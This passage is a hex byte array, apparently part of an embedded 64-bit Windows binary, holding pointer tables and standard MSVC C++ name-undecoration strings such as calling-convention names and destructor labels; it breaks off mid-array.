0x0, 0x4, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x34, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x1b, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x1b, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0xe4, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0xe4, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0xe4, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xaf, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5c, 0x97, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0xd8, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x44, 0x9c, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf8, 0xd2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7c, 0x98, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xe4, 0x26, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x52, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7c, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x94, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9c, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xac, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xcc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xdc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xec, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x22, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x52, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x52, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xac, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x1, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x15, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x64, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x63, 0x64, 0x65, 0x63, 0x6c, 0x0, 0x5f, 0x5f, 0x70, 0x61, 0x73, 0x63, 0x61, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x73, 0x74, 0x64, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x74, 0x68, 0x69, 0x73, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x66, 0x61, 0x73, 0x74, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x63, 0x6c, 0x72, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x65, 0x61, 0x62, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x73, 0x77, 0x69, 0x66, 0x74, 0x5f, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x73, 0x77, 0x69, 0x66, 0x74, 0x5f, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x70, 0x74, 0x72, 0x36, 0x34, 0x0, 0x5f, 0x5f, 0x72, 0x65, 0x73, 0x74, 0x72, 0x69, 0x63, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x75, 0x6e, 0x61, 0x6c, 0x69, 0x67, 0x6e, 0x65, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x65, 0x73, 0x74, 0x72, 0x69, 0x63, 0x74, 0x28, 0x0, 0x0, 0x0, 0x20, 0x6e, 0x65, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x64, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x0, 0x3d, 0x0, 0x0, 0x0, 0x3e, 0x3e, 0x0, 0x0, 0x3c, 0x3c, 0x0, 0x0, 0x21, 0x0, 0x0, 0x0, 0x3d, 0x3d, 0x0, 0x0, 0x21, 0x3d, 0x0, 0x0, 0x5b, 0x5d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x0, 0x0, 0x0, 0x0, 0x2d, 0x3e, 0x0, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x2b, 0x2b, 0x0, 0x0, 0x2d, 0x2d, 0x0, 0x0, 0x2d, 0x0, 0x0, 0x0, 0x2b, 0x0, 0x0, 0x0, 0x26, 0x0, 0x0, 0x0, 0x2d, 0x3e, 0x2a, 0x0, 0x2f, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x3c, 0x0, 0x0, 0x0, 0x3c, 0x3d, 0x0, 0x0, 0x3e, 0x0, 0x0, 0x0, 0x3e, 0x3d, 0x0, 0x0, 0x2c, 0x0, 0x0, 0x0, 0x28, 0x29, 0x0, 0x0, 0x7e, 0x0, 0x0, 0x0, 0x5e, 0x0, 0x0, 0x0, 0x7c, 0x0, 0x0, 0x0, 0x26, 0x26, 0x0, 0x0, 0x7c, 0x7c, 0x0, 0x0, 0x2a, 0x3d, 0x0, 0x0, 0x2b, 0x3d, 0x0, 0x0, 0x2d, 0x3d, 0x0, 0x0, 0x2f, 0x3d, 0x0, 0x0, 0x25, 0x3d, 0x0, 0x0, 0x3e, 0x3e, 0x3d, 0x0, 0x3c, 0x3c, 0x3d, 0x0, 0x26, 0x3d, 0x0, 0x0, 0x7c, 0x3d, 0x0, 0x0, 0x5e, 0x3d, 0x0, 0x0, 0x60, 0x76, 0x66, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x62, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x63, 0x61, 0x6c, 0x6c, 0x27, 0x0, 0x60, 0x74, 0x79, 0x70, 0x65, 0x6f, 0x66, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x20, 0x73, 0x74, 0x61, 0x74, 0x69, 0x63, 0x20, 0x67, 0x75, 0x61, 0x72, 0x64, 0x27, 0x0, 0x0, 0x0, 0x0, 0x60, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x62, 0x61, 0x73, 0x65, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x64, 0x65, 0x6c, 0x65, 0x74, 0x69, 0x6e, 0x67, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x0, 0x60, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x75, 0x72, 0x65, 0x27, 0x0, 0x0, 0x0, 0x60, 0x73, 0x63, 0x61, 0x6c, 0x61, 0x72, 0x20, 0x64, 0x65, 0x6c, 0x65, 0x74, 0x69, 0x6e, 0x67, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x60, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x76, 0x62, 0x61, 0x73, 0x65, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x20, 0x64, 0x69, 0x73, 0x70, 0x6c, 0x61, 0x63, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x20, 0x6d, 0x61, 0x70, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x65, 0x68, 0x20, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x65, 0x68, 0x20, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x27, 0x0, 0x60, 0x65, 0x68, 0x20, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x76, 0x62, 0x61, 0x73, 0x65, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x6f, 0x72, 0x20, 0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 